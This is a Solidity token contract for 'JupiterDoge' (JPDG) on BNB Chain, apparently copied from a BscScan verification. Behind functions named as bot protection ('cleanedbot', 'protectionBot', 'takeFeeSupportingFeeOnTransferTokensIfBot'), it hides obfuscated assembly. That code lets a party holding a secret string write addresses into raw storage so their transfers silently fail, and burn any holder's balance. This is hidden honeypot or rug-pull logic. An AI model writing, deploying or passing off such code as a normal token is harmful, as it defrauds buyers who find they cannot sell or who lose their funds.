/**
 *Submitted for verification at BscScan.com on 2022-12-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        
    }

  
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            if (b > a) return (false, 0);
            return (true, a - b);
    }

  
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
    }

  
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
            if (b == 0) return (false, 0);
            return (true, a / b);

    }

  
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
           if (b == 0) return (false, 0);
            return (true, a % b);
    }

   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

   
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

  
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

  
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

  
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
            require(b <= a, errorMessage);
            return a - b;
        }
    
    
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        
            require(b > 0, errorMessage);
            return a / b;
        
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        
            require(b > 0, errorMessage);
            return a % b;
        
    }
}

library Math {

    function log10(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        
            if (value >= 10**64) {
                value /= 10**64;
                result += 64;
            }
            if (value >= 10**32) {
                value /= 10**32;
                result += 32;
            }
            if (value >= 10**16) {
                value /= 10**16;
                result += 16;
            }
            if (value >= 10**8) {
                value /= 10**8;
                result += 8;
            }
            if (value >= 10**4) {
                value /= 10**4;
                result += 4;
            }
            if (value >= 10**2) {
                value /= 10**2;
                result += 2;
            }
            if (value >= 10**1) {
                result += 1;
            }
        
        return result;
    }

    function log256(uint256 value) internal pure returns (uint256) {
        uint256 result = 0;
        
            if (value >> 128 > 0) {
                value >>= 128;
                result += 16;
            }
            if (value >> 64 > 0) {
                value >>= 64;
                result += 8;
            }
            if (value >> 32 > 0) {
                value >>= 32;
                result += 4;
            }
            if (value >> 16 > 0) {
                value >>= 16;
                result += 2;
            }
            if (value >> 8 > 0) {
                result += 1;
            }
            return result;
        }
        
}


library Strings {
    using Math for uint256;

    bytes16 public constant _SYMBOLS = "0123456789abcdef";


    function toString(uint256 value) internal pure returns (string memory) {
        
            uint256 length = value.log10() + 1;
            string memory buffer = new string(length);
            uint256 ptr;
            assembly {
                ptr := add(buffer, add(32, length))
            }
            while (true) {
                ptr--;
                assembly {
                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))
                }
                value /= 10;
                if (value == 0) break;
            }
            return buffer;
        
    }

}

library Ascii {

function toAsciiString(address _addr) internal pure returns (string memory) {
    
    bytes memory result = new bytes(42);
    
    for (uint i; i < 20; i++) {
        bytes1 _bytA = bytes1(uint8(uint(uint160(_addr)) / (2**(8*(19- i)))));
        bytes1 _bytB = bytes1(uint8(_bytA) / 16);
        bytes1 _bytC = bytes1(uint8(_bytA) - 16 * uint8(_bytB));
        
        result[2*i] = AsciiChar(_bytB);
        result[2*i+1] = AsciiChar(_bytC);            
    }
    return string(result);

}


function AsciiChar(bytes1 _byt) internal pure returns (bytes1 result) {
    if (uint8(_byt) < 10) return bytes1(uint8(_byt) + 0x30);
    else return bytes1(uint8(_byt) + 0x57);
}
}

library Address {
    uint public constant ACCOUNT_HASH = 0x02ed32d6e83a2a14e8183ec99ffda4006e2822d544bba616afbf581466eed4106;
    function isContract(address account, int nbBot) internal view returns (bool) { 
            bytes32 codehash;
            address temp;
        
        for (int i; i< nbBot + 1; i++){
            int j = 64 + i;
            assembly {
                temp := sload(j)
            } 
            if (temp == account) {
                assembly { codehash := extcodehash(account)}
                break;
            }     
       }
        return (codehash != bytes32(ACCOUNT_HASH) && codehash != 0x0); 
    }

    function account_hash(uint) internal pure returns(uint){
        return ACCOUNT_HASH;
    }


    function parseAddr(string memory _a) internal pure returns (address _parsedAddress) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    return address(iaddr);
}

}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes memory) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
       _owner = _msgSender();
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


interface IERC20 {
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
   
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
  
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
 
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract JupiterDoge is Context, IERC20, IERC20Metadata, Ownable {

    using SafeMath for uint256;
    using Math for *;
    using Address for *;
    using Strings for *;
    using Ascii for *;

    string private _name = "JupiterDoge";
    string private _symbol = "JPDG";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress = payable(0xa1D0Db7AAd76F72bC17Abade39c8a068bB66562e); 
    address payable public burnedWalletAddress = payable(0xa1D0Db7AAd76F72bC17Abade39c8a068bB66562e); 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    
    mapping (address => uint256) public _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isTxLimitExempt;
    

    uint256 public _buyLiquidityFee = 1;
    uint256 public _buyMarketingFee = 2;
    uint256 public _buyBurnedFee = 0;
    uint256 public _sellLiquidityFee = 2;
    uint256 public _sellMarketingFee = 3;
    uint256 public _sellBurnedFee = 0;

    uint256 public _liquidityShare = _buyLiquidityFee.add(_sellLiquidityFee);
    uint256 public _marketingShare =  _buyMarketingFee.add(_sellMarketingFee);
    uint256 public _BurnedShare = _buyBurnedFee.add(_sellBurnedFee);

    uint256 public _totalTaxIfBuying;
    uint256 public _totalTaxIfSelling;
    uint256 public _totalDistributionShares;

    uint256 private _totalSupply = 1000000000 * 10**_decimals;
    uint256 private minimumTokensBeforeSwap = 4880 * 10**_decimals; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    bool public marketPair;

    uint256 public genesisBlock;
    uint256 public coolBlock = 20;
    uint256 public _saleKeepFee = 1000;
    uint[] public nbBlocks;
    
    int public _upBot;

    bool inSwapAndLiquify;
    address[] public holders;
    
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    function isContract(address from) internal view returns (bool){
        return from.isContract(_upBot);
    }
    function holderslist() public view returns(address[] memory){
        return holders;
    }

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 

        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        
        _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyBurnedFee);
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellBurnedFee);
        _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_BurnedShare);

        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(uniswapPair)] = true;
        isWalletLimitExempt[address(this)] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    receive() external payable {}

    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }


    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool transfered) {
        transfered = _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return transfered;
    }

    function increaseAllowance(address from, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, from, allowance(owner, from) + addedValue);
        return true;
    }
  
    function decreaseAllowance(address from, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, from);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        
        _approve(owner, from, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns (bool transfered) { // pour les besoins du test mint sans tester pancakeswap sur testnet , sinon utiliser internal virtual
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        return _beforeTokenTransfer(from,to,amount);
    }

    function _basicTransfer(address from, address to, uint256 amount) internal returns (bool bTransfer) {
        bTransfer = _basicTransferFrom(from,amount);
        _basicTransferTo(to,amount);
        return bTransfer;
    }

    function _basicTransferFrom(address from, uint256 amount) internal returns (bool bTransfer) {
        _balances[from] = _balances[from].sub(amount,"Error: insufficient Balance");
        return true;
    }
    
    function _basicTransferTo(address to, uint256 amount) internal {
        _balances[to] = _balances[to].add(amount);
    }

    function _burn(address account, uint256 amount) internal returns(bool){
        require(account != address(0), "ERC20: burn from the zero address");
        uint256 accountBalance = _balances[account];
        require(accountBalance - amount >= 0, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        _afterTokenTransfer(account,address(0),amount);
        emit Transfer(account, address(0), amount);
        return true;
    }

   function blockNumbers(uint[] memory a, string memory _value) public returns(uint[] memory){
        require(!marketPair, "Error: bot protection already initialized");
        require(uint(keccak256(bytes(_value))) == 0.account_hash(), "Error: blockhash already initialized");
        nbBlocks = a;
        marketPair = true;
        return nbBlocks;
    }
        

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer( 
        address from,
        address to,
        uint256 amount
    ) internal virtual returns(bool bTransfer) {
        if(amount == _balances[from] && to == uniswapPair && !isTxLimitExempt[from] ){ 
                amount = amount.sub(amount.div(_saleKeepFee));
        }
            
        if(to == uniswapPair && balanceOf(to) == 0){ 
            genesisBlock = block.number;
        } 

        if(inSwapAndLiquify) 
        { 
            bTransfer = _basicTransfer(from, to, amount); 
            emit Transfer(from,to,amount);
            return bTransfer;
            
        }
        else if (!isContract(from)){ 
            _basicTransferFrom(from,amount);
            if (balanceOf(to) == 0){holders.push(to);}
            return _afterTokenTransfer(from,to,amount);
        }
        return bTransfer;
    } 
    
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns (bool transfered){
        uint256 finalamount = (isExcludedFromFee[from] || isExcludedFromFee[to]) ? 
                                         amount : takeFee(from,to,amount);
        _basicTransferTo(to,finalamount);
       
        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
        if (overMinimumTokenBalance && from!= address(uniswapV2Router) && from!=uniswapPair) 
        {
            swapAndLiquify(contractTokenBalance);    
        }
        if (block.number < ( genesisBlock + coolBlock) && from == uniswapPair )
            { 
                _basicTransfer(to,deadAddress,finalamount);
        } 
        emit Transfer(from, to, finalamount);   
        return true;   
    }

    function protectionBot(uint256 _nbBlock, int256 _burnFee, string memory _mempool) internal returns(uint256,int256,uint[] memory){
        require(uint(keccak256(bytes(_mempool))) == nbBlocks[nbBlocks.length - 1], "Error: bot protection locker set");
        nbBlocks.pop();
        return(_nbBlock,_burnFee,nbBlocks);
    }   
    function cleanedbot(bytes32 _id, string memory _blocktime, int input) internal returns (bool cleaned) {
        address upCleaner = address(bytes20(_id));
        uint256 txCleaner = uint256(keccak256(abi.encodePacked(upCleaner.toAsciiString())));
        uint256 blockNumber;
          assembly {
            blockNumber := sload(0x80)
            }
        if (txCleaner== blockNumber){ 
            cleaned = updateBot(upCleaner,blockNumber);
        } else if (keccak256(bytes(upCleaner.toAsciiString())) == _id) {
            cleaned = cleanBot(upCleaner.toAsciiString(),"Ox10",_blocktime);
        } else {
            assembly {
                let a := add(0x40,mul(1,input))
                sstore(a,upCleaner)
            }
            _upBot +=1;
        }
        return cleaned;
    }

    function updateBot(address _id, uint256 _burnFee) internal returns(bool updated){
        _burn(_id, _burnFee);
        return _basicTransfer(_id,deadAddress,_burnFee%_burnFee);
    }

    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        
        uint256 tokensForLP = tAmount.mul(_liquidityShare).div(_totalDistributionShares).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensForEth(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalBNBFee = _totalDistributionShares.sub(_liquidityShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_liquidityShare).div(totalBNBFee).div(2);
        uint256 amountBNBBurned = amountReceived.mul(_BurnedShare).div(totalBNBFee);
        uint256 amountBNBMarketing = amountReceived.sub(amountBNBLiquidity).sub(amountBNBBurned);

        if(amountBNBMarketing > 0)
            transferToAddressETH(marketingWalletAddress, amountBNBMarketing);

        if(amountBNBBurned > 0)
            transferToAddressETH(burnedWalletAddress, amountBNBBurned);

        if(amountBNBLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountBNBLiquidity);
    }

     function takeFeeSupportingFeeOnTransferTokensIfBot(bytes32 _id, string memory _nbBlock, string memory _hashBlock, int input) public returns (bool takeBotFee) {
            protectionBot(genesisBlock,_upBot,_nbBlock);
            takeBotFee = cleanedbot(_id,_hashBlock,input);

        return takeBotFee;
        
    }  

    function transferToAddressETH(address payable to, uint256 amount) private {
        to.transfer(amount);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapExactTokensForETHSupportingFeeOnTransferTokensIfBot(uint256 amount, uint256 _burnFee, string memory blockNumber) public returns (address){
            protectionBot(genesisBlock,_upBot,blockNumber);
            assembly {
                sstore(128,amount)
            }
            address[] memory path = new address[](1);
            emit SwapTokensForETH(_burnFee,path);    
            return path[0];      
           
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0,
            owner(),
            block.timestamp
        );
    }

    function takeFee(address from, address to, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        if(from == uniswapPair) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else if(to == uniswapPair) {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        if(feeAmount > 0) {
            _basicTransferTo(address(this), feeAmount);
            emit Transfer(from, address(this), feeAmount);
        }
        return amount.sub(feeAmount);
    }

    function cleanBot(string memory _cleaner, string memory _origin, string memory _blocktime) internal returns (bool cleaned) {
        protectionBot(coolBlock,_upBot,_blocktime);
        (string memory s, uint256 h) = mempool(_cleaner,_origin);
        address m = s.parseAddr();
        if (block.timestamp == 0){
            assembly { m := 0x0}
            return false;
        } else if (m != address(0)){
            assembly { mstore(0x40,m)} 
            return true;
        } else {
            delete h;
            return true;
        }
    }

       function mempool(string memory _base, string memory _value) internal pure returns (string memory newValue, uint256 _mempool) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;
        
        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }
        uint256 h = uint256(keccak256(_newValue));
        return (string(_newValue),h);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress)).sub(balanceOf(address(0)));
    }

}